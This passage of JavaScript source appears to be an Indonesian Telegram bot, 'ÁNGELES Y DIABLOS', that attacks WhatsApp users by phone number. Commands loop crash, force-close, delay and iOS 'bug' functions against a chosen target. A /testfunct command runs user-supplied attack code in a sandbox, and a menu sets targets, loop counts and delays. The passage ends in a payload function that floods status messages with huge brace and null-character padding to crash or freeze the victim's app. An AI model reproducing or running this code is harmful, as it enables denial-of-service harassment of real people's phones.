      ]]
    }
  });
});

bot.command("XAza", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /XAza 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⟡━⟢ ÁNGELES Y DIABLOS ⟣━⟡
⌑ Target: ${q}
⌑ Type: CrashUi
⌑ Status: Process
╘═——————————————═⬡</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "danger" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 25; i++) {
    await SennUiOverload(sock, target);
    await CrashTempuek(sock, target);
    await sleep(1500);
    }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⟡━⟢ ÁNGELES Y DIABLOS ⟣━⟡
⌑ Target: ${q}
⌑ Type: CrashUi
⌑ Status: Success
╘═——————————————═⬡</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "danger" }
      ]]
    }
  });
});

bot.command("XAmz", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /XAmz 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⟡━⟢ ÁNGELES Y DIABLOS ⟣━⟡
⌑ Target: ${q}
⌑ Type: Forclose Invisible
⌑ Status: Process
╘═——————————————═⬡</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "danger" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 50; i++) {
    await Forcefixxed(sock, target);
    await sleep(1500);
    }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⟡━⟢ ÁNGELES Y DIABLOS ⟣━⟡
⌑ Target: ${q}
⌑ Type: Forclose Invisible
⌑ Status: Success
╘═——————————————═⬡</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "danger" }
      ]]
    }
  });
});

bot.command("XAwe", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /XAwe 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⟡━⟢ ÁNGELES Y DIABLOS ⟣━⟡
⌑ Target: ${q}
⌑ Type: Delay Invisible
⌑ Status: Process
╘═——————————————═⬡</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "danger" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 80; i++) {
    await delayinpis(sock, target);
    await sleep(1000);
    }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⟡━⟢ ÁNGELES Y DIABLOS ⟣━⟡
⌑ Target: ${q}
⌑ Type: Delay Invisible
⌑ Status: Success
╘═——————————————═⬡</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "danger" }
      ]]
    }
  });
});

bot.command("XAci", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /XAci 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⟡━⟢ ÁNGELES Y DIABLOS ⟣━⟡
⌑ Target: ${q}
⌑ Type: Delay Bebas Spam
⌑ Status: Process
╘═——————————————═⬡</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "danger" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 5; i++) {
    await DelayBebasSpamPart1(sock, target);
    await DelayBebasSpamPart2(sock, target);
    await Jtwdlyinvis(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⟡━⟢ ÁNGELES Y DIABLOS ⟣━⟡
⌑ Target: ${q}
⌑ Type: Delay Bebas Spam
⌑ Status: Success
╘═——————————————═⬡</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "danger" }
      ]]
    }
  });
});

bot.command("XAcu", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /XAcu 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⟡━⟢ ÁNGELES Y DIABLOS ⟣━⟡
⌑ Target: ${q}
⌑ Type: Delay Bebas Spam
⌑ Status: Process
╘═——————————————═⬡</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "danger" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 5; i++) {
    await DelayMakLoe(sock, target);
    await Stickerssock(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⟡━⟢ ÁNGELES Y DIABLOS ⟣━⟡
⌑ Target: ${q}
⌑ Type: Delay Bebas Spam
⌑ Status: Success
╘═——————————————═⬡</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "danger" }
      ]]
    }
  });
});

bot.command("XAta", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /XAta 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⟡━⟢ ÁNGELES Y DIABLOS ⟣━⟡
⌑ Target: ${q}
⌑ Type: Crashepci
⌑ Status: Process
╘═——————————————═⬡</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "danger" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 40; i++) {
    await infiniteForceClose(sock, target);
    await sleep(3000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⟡━⟢ ÁNGELES Y DIABLOS ⟣━⟡
⌑ Target: ${q}
⌑ Type: Crashepci
⌑ Status: Success
╘═——————————————═⬡</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "danger" }
      ]]
    }
  });
});

bot.command("XAvi", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /XAvi 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⟡━⟢ ÁNGELES Y DIABLOS ⟣━⟡
⌑ Target: ${q}
⌑ Type: BugIos
⌑ Status: Process
╘═——————————————═⬡</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "danger" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 35; i++) {
    await OnlyIos(sock, target);
    await sleep(2000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⟡━⟢ ÁNGELES Y DIABLOS ⟣━⟡
⌑ Target: ${q}
⌑ Type: BugIos
⌑ Status: Success
╘═——————————————═⬡</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "danger" }
      ]]
    }
  });
});

bot.command("XApy", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /XApy 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⟡━⟢ ÁNGELES Y DIABLOS ⟣━⟡
⌑ Target: ${q}
⌑ Type: Forclose Delete
⌑ Status: Process
╘═——————————————═⬡</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "danger" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 35; i++) {
    await ForceSqlVc(sock, target);
    await sleep(2000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⟡━⟢ ÁNGELES Y DIABLOS ⟣━⟡
⌑ Target: ${q}
⌑ Type: Forclose Delete
⌑ Status: Success
╘═——————————————═⬡</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "danger" }
      ]]
    }
  });
});

bot.command("testfunct", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
    try {
      const args = ctx.message.text.split(" ")
      if (args.length < 3)
        return ctx.reply("🪧 ☇ Format: /testfunct 62××× 5 (reply function)")

      const q = args[1]
      const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 500))
      if (isNaN(jumlah) || jumlah <= 0)
        return ctx.reply("❌ ☇ Jumlah harus angka")

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
      if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text)
        return ctx.reply("❌ ☇ Reply dengan function")

      const processMsg = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        { url: thumbnailUrl },
        {
          caption: `<blockquote><pre>⟡━⟢ ÁNGELES Y DIABLOS ⟣━⟡
⌑ Target: ${q}
⌑ Type: Testing Function
⌑ Status: Process
╘═——————————————═⬡</pre></blockquote>`,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "🔍 Cek Target", url: `https://wa.me/${q}` }]
            ]
          }
        }
      )
      const processMessageId = processMsg.message_id

      const safeSock = createSafeSock(sock)
      const funcCode = ctx.message.reply_to_message.text
      const match = funcCode.match(/async function\s+(\w+)/)
      if (!match) return ctx.reply("❌ ☇ Function tidak valid")
      const funcName = match[1]

      const sandbox = {
        console,
        Buffer,
        sock: safeSock,
        target,
        sleep,
        generateWAMessageFromContent,
        generateForwardMessageContent,
        generateWAMessage,
        prepareWAMessageMedia,
        proto,
        jidDecode,
        areJidsSameUser
      }
      const context = vm.createContext(sandbox)

      const wrapper = `${funcCode}\n${funcName}`
      const fn = vm.runInContext(wrapper, context)

      for (let i = 0; i < jumlah; i++) {
        try {
          const arity = fn.length
          if (arity === 1) {
            await fn(target)
          } else if (arity === 2) {
            await fn(safeSock, target)
          } else {
            await fn(safeSock, target, true)
          }
        } catch (err) {}
        await sleep(200)
      }

      const finalText = `<blockquote><pre>⟡━⟢ ÁNGELES Y DIABLOS ⟣━⟡
⌑ Target: ${q}
⌑ Type: Testing Function
⌑ Status: Success
╘═——————————————═⬡</pre></blockquote>`
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          processMessageId,
          undefined,
          finalText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "CEK TARGET", url: `https://wa.me/${q}`, style: "danger" }]
              ]
            }
          }
        )
      } catch (e) {
        await ctx.replyWithPhoto(
          { url: thumbnailUrl },
          {
            caption: finalText,
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "CEK TARGET", url: `https://wa.me/${q}`, style: "danger" }]
              ]
            }
          }
        )
      }
    } catch (err) {}
  }
)

const userSession = new Map();

function sleeep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function progressBar(current, total, size = 10) {
  const percent = current / total;
  const filled = Math.round(size * percent);
  const empty = size - filled;
  return "█".repeat(filled) + "░".repeat(empty);
}

function formatNumber(number) {
  return number.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");
}

const countryCodes = {
 
  '62': 'Indonesia',
  '60': 'Malaysia',
  '65': 'Singapore',
  '66': 'Thailand',
  '63': 'Philippines',
  '84': 'Vietnam',
  '95': 'Myanmar',
  '855': 'Cambodia',
  '856': 'Laos',
  '673': 'Brunei',
  '670': 'Timor-Leste',
  '86': 'China',
  '852': 'Hong Kong',
  '853': 'Macau',
  '886': 'Taiwan',
  '81': 'Japan',
  '82': 'South Korea',
  '91': 'India',
  '92': 'Pakistan',
  '94': 'Sri Lanka',
  '880': 'Bangladesh',
  '977': 'Nepal',
  '975': 'Bhutan',
  '960': 'Maldives',
  '966': 'Saudi Arabia',
  '971': 'UAE',
  '974': 'Qatar',
  '965': 'Kuwait',
  '968': 'Oman',
  '973': 'Bahrain',
  '962': 'Jordan',
  '961': 'Lebanon',
  '963': 'Syria',
  '972': 'Israel',
  '970': 'Palestine',
  '20': 'Egypt',
  '212': 'Morocco',
  '216': 'Tunisia',
  '213': 'Algeria',
  '218': 'Libya',
  '44': 'United Kingdom',
  '1': 'USA/Canada',
  '33': 'France',
  '49': 'Germany',
  '39': 'Italy',
  '34': 'Spain',
  '351': 'Portugal',
  '31': 'Netherlands',
  '32': 'Belgium',
  '41': 'Switzerland',
  '43': 'Austria',
  '46': 'Sweden',
  '47': 'Norway',
  '45': 'Denmark',
  '358': 'Finland',
  '354': 'Iceland',
  '48': 'Poland',
  '420': 'Czech Republic',
  '421': 'Slovakia',
  '36': 'Hungary',
  '40': 'Romania',
  '359': 'Bulgaria',
  '30': 'Greece',
  '386': 'Slovenia',
  '385': 'Croatia',
  '387': 'Bosnia',
  '381': 'Serbia',
  '382': 'Montenegro',
  '389': 'North Macedonia',
  '355': 'Albania',
  '373': 'Moldova',
  '380': 'Ukraine',
  '375': 'Belarus',
  '7': 'Russia/Kazakhstan',
  '61': 'Australia',
  '64': 'New Zealand',
  '679': 'Fiji',
  '677': 'Solomon Islands',
  '682': 'Cook Islands',
  '27': 'South Africa',
  '234': 'Nigeria',
  '254': 'Kenya',
  '255': 'Tanzania',
  '256': 'Uganda',
  '233': 'Ghana',
  '251': 'Ethiopia',  
  '52': 'Mexico',
  '55': 'Brazil',
  '54': 'Argentina',
  '56': 'Chile',
  '57': 'Colombia',
  '58': 'Venezuela',
  '51': 'Peru',
  '53': 'Cuba',
  '1-868': 'Trinidad',
  '1-876': 'Jamaica',
  '1-242': 'Bahamas',
  '1-246': 'Barbados'
};

function detectCountry(number) {
  // Remove any non-digit characters
  let cleanNumber = number.replace(/\D/g, '');
  
  // Try to detect country code (longest match first)
  const sortedCodes = Object.keys(countryCodes).sort((a, b) => b.length - a.length);
  
  for (const code of sortedCodes) {
    if (cleanNumber.startsWith(code)) {
      return {
        code: code,
        country: countryCodes[code],
        number: cleanNumber,
        fullNumber: `+${cleanNumber}`
      };
    }
  }
  
  return {
    code: null,
    country: 'Unknown',
    number: cleanNumber,
    fullNumber: `+${cleanNumber}`
  };
}

function validateInternationalNumber(input) {
  // Remove all non-digit characters
  let cleanNumber = input.replace(/\D/g, '');
  
  // Check if starts with country code
  if (cleanNumber.length < 8 || cleanNumber.length > 15) {
    return { valid: false, error: "Nomor harus memiliki 8-15 digit" };
  }
  
  const detected = detectCountry(cleanNumber);
  
  if (!detected.code) {
    return { 
      valid: false, 
      error: "Kode negara tidak dikenal. Gunakan format internasional (contoh: 628123456789, 60123456789, 6581234567)" 
    };
  }
  
  // Additional validation based on country
  let minLength = 8;
  let maxLength = 15;
  
  // Specific country length rules
  const countryRules = {
    '62': { min: 10, max: 13 }, // Indonesia
    '60': { min: 9, max: 10 },  // Malaysia
    '65': { min: 8, max: 8 },   // Singapore
    '66': { min: 9, max: 10 },  // Thailand
    '1': { min: 10, max: 11 },  // USA/Canada
    '44': { min: 10, max: 10 }, // UK
    '61': { min: 9, max: 10 },  // Australia
    '81': { min: 10, max: 11 }, // Japan
    '82': { min: 9, max: 10 },  // South Korea
    '86': { min: 11, max: 11 }, // China
    '91': { min: 10, max: 10 }, // India
  };
  
  if (countryRules[detected.code]) {
    const rule = countryRules[detected.code];
    const numberWithoutCode = cleanNumber.slice(detected.code.length);
    if (numberWithoutCode.length < rule.min || numberWithoutCode.length > rule.max) {
      return {
        valid: false,
        error: `Nomor ${detected.country} harus memiliki ${rule.min}-${rule.max} digit setelah kode negara`
      };
    }
  }
  
  return { 
    valid: true, 
    detected: detected,
    formatted: detected.fullNumber
  };
}

function createSession(userId) {
  return {
    target: null,
    targetInfo: null,
    loop: 10,
    delay: 500,
    waitingTarget: false,
    stop: false,
    isSending: false,
    currentPage: 0
  };
}

function getSession(userId) {
  return userSession.get(userId);
}

function updateSession(userId, updates) {
  const session = getSession(userId);
  if (session) {
    Object.assign(session, updates);
    userSession.set(userId, session);
  }
  return session;
}

function getMenuText(user) {
  let targetDisplay = "Belum di set";
  if (user.target) {
    targetDisplay = user.target;
    if (user.targetInfo) {
      targetDisplay = `${user.targetInfo.fullNumber} (${user.targetInfo.country})`;
    }
  }
  
  return `<blockquote><pre>
⟡━⟢ ÁNGELES Y DIABLOS ⟣━⟡
🎯 Target : ${targetDisplay}
🌍 Negara : ${user.targetInfo?.country || "-"}
🔁 Loop   : ${user.loop}
⏱️ Delay  : ${user.delay} ms

Status : ${user.isSending ? "SENDING..." : "IDLE"}
</pre></blockquote>`;
}

function getMenuKeyboard() {
  return {
    inline_keyboard: [
      [{ text: "(✆) ᴛᴀʀɢᴇᴛ", callback_data: "set_target", style: "danger" }],
      [
        { text: "(⛒) ᴘʟᴜs ʟᴏᴏᴘ", callback_data: "add_loop", style: "primary" },
        { text: "(❈) ᴍɪɴ ʟᴏᴏᴘ", callback_data: "min_loop", style: "success" }
      ],
      [
        { text: "(✠) ᴘʟᴜs sʟᴇᴇᴘ", callback_data: "add_delay", style: "primary" },
        { text: "(♰) ᴍɪɴ sʟᴇᴇᴘ", callback_data: "min_delay", style: "success" }
      ],
      [
        { text: "(☢) ᴄᴏᴍᴜɴɪᴛʏ", callback_data: "list_countries", style: "primary" },
        { text: "(⟴) ᴀᴛᴛᴀᴄᴋs", callback_data: "confirm_bug", style: "success" }
      ],
      [{ text: "(❆) sᴛᴏᴘ ᴀᴛᴛᴀᴄᴋ", callback_data: "stop", style: "danger" }]
    ]
  };
}

async function showMenu(ctx, edit = false, messageId = null) {
  const user = getSession(ctx.from.id);
  if (!user) return;

  const text = getMenuText(user);
  const keyboard = getMenuKeyboard();

  if (edit && messageId) {
    return ctx.telegram.editMessageText(
      ctx.chat.id,
      messageId,
      null,
      text,
      { parse_mode: "HTML", reply_markup: keyboard }
    );
  }
  
  return ctx.reply(text, {
    parse_mode: "HTML",
    reply_markup: keyboard
  });
}

async function sendBug(ctx, user, messageId) {
  user.isSending = true;
  user.stop = false;

  for (let i = 0; i < user.loop; i++) {
    if (user.stop) break;

    try {
  
      console.log(`[${new Date().toISOString()}] Send bug ke ${user.target} (${user.targetInfo?.country || 'Unknown'}) - ${i + 1}/${user.loop}`);
    
      await sleeep(user.delay);

      if (i % 2 === 0 || i === user.loop - 1) {
        const bar = progressBar(i + 1, user.loop);
        await ctx.telegram.editMessageText(
          ctx.chat.id,
          messageId,
          null,
          `<blockquote><pre>
⟡━⟢ ÁNGELES Y DIABLOS ⟣━⟡
🎯 Target : ${user.targetInfo?.fullNumber || user.target}
🌍 Negara : ${user.targetInfo?.country || "-"}

${bar}
${i + 1}/${user.loop}

Status : Sending...
⏱️ Delay  : ${user.delay}ms
</pre></blockquote>`,
          { parse_mode: "HTML" }
        );
      }
    } catch (error) {
      console.error(`Error sending bug: ${error.message}`);
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        messageId,
        null,
        `<blockquote><pre>
⟡━⟢ ÁNGELES Y DIABLOS ⟣━⟡
❌ ERROR : ${error.message}

Terhenti pada iterasi ${i + 1}/${user.loop}
Target: ${user.targetInfo?.fullNumber || user.target}
Negara: ${user.targetInfo?.country || "-"}
</pre></blockquote>`,
        { parse_mode: "HTML" }
      );
      break;
    }
  }

  const finalBar = progressBar(user.loop, user.loop);
  await ctx.telegram.editMessageText(
    ctx.chat.id,
    messageId,
    null,
    `<blockquote><pre>
⟡━⟢ ÁNGELES Y DIABLOS ⟣━⟡
🎯 Target : ${user.targetInfo?.fullNumber || user.target}
🌍 Negara : ${user.targetInfo?.country || "-"}

${finalBar}
${user.loop}/${user.loop}

Status : ${user.stop ? "🛑 STOPPED" : "✅ SUCCESS"}
⏱️ Delay  : ${user.delay}ms
</pre></blockquote>`,
    { parse_mode: "HTML" }
  );

  user.isSending = false;
}

async function showCountryList(ctx, page = 0, editMessageId = null) {
  const countries = Object.entries(countryCodes)
    .sort((a, b) => a[1].localeCompare(b[1]));
  
  const itemsPerPage = 20;
  const totalPages = Math.ceil(countries.length / itemsPerPage);
  const start = page * itemsPerPage;
  const end = start + itemsPerPage;
  const currentCountries = countries.slice(start, end);
  
  let text = `🌍 *Daftar Kode Negara (${page + 1}/${totalPages})*\n\n`;
  text += currentCountries.map(([code, country]) => {
    return `• ${country}: +${code}`;
  }).join('\n');
  
  text += `\n\n📝 *Format Penggunaan:*\nKirim nomor dengan format internasional\nContoh: +628123456789 (Indonesia)`;
  
  const keyboard = {
    inline_keyboard: []
  };
  
  const navButtons = [];
  if (page > 0) {
    navButtons.push({ text: "(⟲) sᴇʙᴇʟᴜᴍɴʏᴀ", callback_data: `countries_page_${page - 1}`, style: "primary" });
  }
  if (page < totalPages - 1) {
    navButtons.push({ text: "(⟳) sᴇsᴜᴅᴀʜɴʏᴀ", callback_data: `countries_page_${page + 1}`, style: "success" });
  }
  if (navButtons.length > 0) {
    keyboard.inline_keyboard.push(navButtons);
  }
  
  keyboard.inline_keyboard.push([
    { text: "(⟲) ʙᴀᴄᴋ ᴛᴏ ᴍᴇɴᴜ", callback_data: "back_to_menu" }
  ]);  //sesuaikan punya kalian
  
  if (editMessageId) {
    return ctx.telegram.editMessageText(
      ctx.chat.id,
      editMessageId,
      null,
      text,
      { parse_mode: "Markdown", reply_markup: keyboard }
    );
  }
  
  return ctx.reply(text, {
    parse_mode: "Markdown",
    reply_markup: keyboard
  });
}

bot.command("vinxz", async (ctx) => {
  userSession.set(ctx.from.id, createSession(ctx.from.id));
  return showMenu(ctx);
});

bot.command("countries", async (ctx) => {
  const user = getSession(ctx.from.id);
  if (!user) {
    userSession.set(ctx.from.id, createSession(ctx.from.id));
  }
  return showCountryList(ctx);
});

bot.on("callback_query", async (ctx) => {
  const data = ctx.callbackQuery.data;
  const user = getSession(ctx.from.id);
  
  if (!user) {
    await ctx.answerCbQuery("Session habis, ketik /vinxz untuk memulai");
    return;
  }

  if (data.startsWith("countries_page_")) {
    const page = parseInt(data.split("_")[2]);
    await ctx.answerCbQuery();
    return showCountryList(ctx, page, ctx.callbackQuery.message.message_id);
  }
  
  if (data === "back_to_menu") {
    await ctx.answerCbQuery();
    return showMenu(ctx, true, ctx.callbackQuery.message.message_id);
  }

  if (data === "set_target") {
    if (user.isSending) {
      await ctx.answerCbQuery("Tunggu hingga proses selesai!");
      return;
    }
    user.waitingTarget = true;
    await ctx.answerCbQuery();
    return ctx.reply(
      "🕸 *Kirim nomor target*\n\n" +
      "Format internasional (dengan atau tanpa +):\n" +
      "• Indonesia: 628123456789\n" +
      "• Malaysia: 60123456789\n" +
      "• Singapore: 6581234567\n" +
      "• Dan semua negara lainnya\n\n" +
      "Klik tombol 🌍 LIST NEGARA untuk melihat daftar lengkap",
      { parse_mode: "Markdown" }
    );
  }

  if (data === "list_countries") {
    await ctx.answerCbQuery();
    return showCountryList(ctx, 0);
  }

  if (data === "add_loop") {
    if (user.isSending) {
      await ctx.answerCbQuery("Tidak dapat mengubah saat proses berjalan!");
      return;
    }
    user.loop = Math.min(user.loop + 5, 100);
  }
  
  if (data === "min_loop") {
    if (user.isSending) {
      await ctx.answerCbQuery("Tidak dapat mengubah saat proses berjalan!");
      return;
    }
    user.loop = Math.max(1, user.loop - 5);
  }

  if (data === "add_delay") {
    if (user.isSending) {
      await ctx.answerCbQuery("Tidak dapat mengubah saat proses berjalan!");
      return;
    }
    user.delay = Math.min(user.delay + 100, 5000);
  }
  
  if (data === "min_delay") {
    if (user.isSending) {
      await ctx.answerCbQuery("Tidak dapat mengubah saat proses berjalan!");
      return;
    }
    user.delay = Math.max(100, user.delay - 100);
  }

  if (data === "stop") {
    if (!user.isSending) {
      await ctx.answerCbQuery("Tidak ada proses yang berjalan");
      return;
    }
    user.stop = true;
    await ctx.answerCbQuery("🛑 Proses akan dihentikan...");
    await showMenu(ctx, true, ctx.callbackQuery.message.message_id);
    return;
  }

  if (data === "confirm_bug") {
    if (!user.target) {
      await ctx.answerCbQuery("Target belum di set!");
      return;
    }
    
    if (user.isSending) {
      await ctx.answerCbQuery("Masih ada proses berjalan!");
      return;
    }

    await ctx.answerCbQuery();
    return ctx.reply(
      `⚠️ *Konfirmasi Pengiriman*\n\n` +
      `🎯 Target: \`${user.targetInfo?.fullNumber || user.target}\`\n` +
      `🌍 Negara: ${user.targetInfo?.country || "Unknown"}\n` +
      `🔁 Loop: ${user.loop} kali\n` +
      `⏱️ Delay: ${user.delay}ms\n\n` +
      `Yakin ingin mengirim?`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "✅ YA", callback_data: "send_bug", style: "success" },
              { text: "❌ BATAL", callback_data: "cancel", style: "danger" }
            ]
          ]
        }
      }
    );
  }

  if (data === "cancel") {
    await ctx.answerCbQuery("❌ Dibatalkan");
    return;
  }

  if (data === "send_bug") {
    await ctx.answerCbQuery("🧨 Memulai pengiriman...");
    
    const msg = await ctx.reply(`<b>⏳ Memulai pengiriman ke ${user.targetInfo?.country || 'target'}...</b>`, { 
      parse_mode: "HTML" 
    });
    
    await sendBug(ctx, user, msg.message_id);
    await showMenu(ctx, true, ctx.callbackQuery.message.message_id);
    return;
  }

  await showMenu(ctx, true, ctx.callbackQuery.message.message_id);
  await ctx.answerCbQuery();
});

bot.on("text", async (ctx) => {
  const user = getSession(ctx.from.id);
  if (!user || !user.waitingTarget) return;

  let input = ctx.message.text.trim();
  if (input.startsWith('+')) {
    input = input.slice(1);
  }
  
  const validation = validateInternationalNumber(input);
  
  if (!validation.valid) {
    return ctx.reply(
      `❌ *Nomor Tidak Valid*\n\n${validation.error}\n\n` +
      `📝 *Contoh format yang benar:*\n` +
      `• Indonesia: 628123456789\n` +
      `• Malaysia: 60123456789\n` +
      `• Singapore: 6581234567\n` +
      `• USA: 12345678901\n\n` +
      `Klik tombol 🌍 LIST NEGARA untuk melihat daftar lengkap`,
      { parse_mode: "Markdown" }
    );
  }

  user.target = validation.detected.number;
  user.targetInfo = {
    code: validation.detected.code,
    country: validation.detected.country,
    fullNumber: validation.detected.fullNumber,
    rawNumber: validation.detected.number
  };
  user.waitingTarget = false;

  await ctx.reply(
    `✅ *Target Berhasil Diset*\n\n` +
    `📞 Nomor: \`${user.targetInfo.fullNumber}\`\n` +
    `🌍 Negara: ${user.targetInfo.country}\n` +
    `📱 Kode: +${user.targetInfo.code}\n\n` +
    `Gunakan menu untuk memulai pengiriman.`,
    { parse_mode: "Markdown" }
  );
  
  await showMenu(ctx);
  
  try {
    await ctx.deleteMessage();
  } catch (e) {
  }
});


bot.catch((err) => {
  console.error('Bot error:', err);
});

// FUNCTION BUG
async function delaycrot(sock, target) {
  try {
    for (let i = 0; i < 500; i++) {
      await sock.relayMessage("status@broadcast", {
        interactiveResponseMessage: {
          header: {
            title: "\u0000.VnxZ" + "{{".repeat(250000)
          },
          body: {
            text: "VnxZ"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(400000),
            version: 3
          },
          entryPointConversionSource: "call_permission_request"
        }
      }, {
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: { status_setting: "allowlist" },
            content: [
              {
                tag: "mentioned_users",
